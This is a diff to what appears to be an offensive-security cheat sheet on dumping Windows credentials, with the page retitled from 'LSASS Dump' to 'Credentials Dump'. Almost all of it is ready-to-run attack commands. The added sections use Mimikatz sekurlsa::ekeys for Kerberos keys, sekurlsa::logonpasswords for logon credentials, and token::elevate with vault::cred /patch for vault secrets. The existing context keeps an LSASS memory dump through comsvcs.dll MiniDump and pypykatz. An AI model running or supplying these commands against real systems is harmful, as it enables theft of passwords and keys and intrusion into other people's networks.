@@ -1,10 +1,15 @@
-# LSASS Dump
+# Credentials Dump
 
 ## LSASS
 
 {% hint style="warning" %}
 high chances of detection
 {% endhint %}
+
+### Kerberos encryption keys
+
+The Kerberos SSP used by LSASS in order to provide different authentication methods.\
+Therefore, it possible to dump Kerberos encryption keys using `sekurlsa::ekeys`.
 
 ```powershell
 # Dump credentials on a local machine using Mimikatz.
@@ -26,4 +31,19 @@ pypykatz.exe live lsa
 tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
 <lsass process ID> C:\Users\Public\lsass.dmp full 
+```
+
+### Logon Passwords&#x20;
+
+This usually shows recently logged on user and computer credentials.
+
+<pre class="language-powershell"><code class="lang-powershell"><strong>Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' 
+</strong></code></pre>
+
+## Vault
+
+Enumerates vault credentials of scheduled tasks.
+
+```powershell
+Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
 ```
